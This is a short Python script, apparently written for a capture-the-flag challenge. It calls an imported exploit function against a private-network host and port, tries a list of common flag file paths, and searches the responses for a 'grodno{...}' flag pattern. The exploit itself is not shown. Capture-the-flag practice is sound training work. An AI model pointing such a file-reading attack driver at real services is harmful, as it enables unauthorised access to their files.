#!/usr/bin/env python3
import re
from exploit_remote import run

HOST = "10.112.0.12"
PORT = 41292
PATHS = [
    "flag",
    "/flag.txt",
    "flag.txt",
    "/app/flag",
    "/app/flag.txt",
    "/home/ctf/flag",
    "/home/ctf/flag.txt",
    "/challenge/flag",
    "/challenge/flag.txt",
    "/opt/flag",
    "/tmp/flag",
]

for path in PATHS:
    try:
        output, len1, len2 = run(HOST, PORT, path)
        flags = re.findall(rb"grodno\{[^}\r\n]+\}", output)
        if flags:
            print(path, "FOUND", flags[-1].decode())
            break
        nonzero = sum(byte != 0 for byte in output[-256:])
        print(path, "NO_FLAG", "tail_nonzero=", nonzero)
    except Exception as exc:
        print(path, "ERROR", exc)
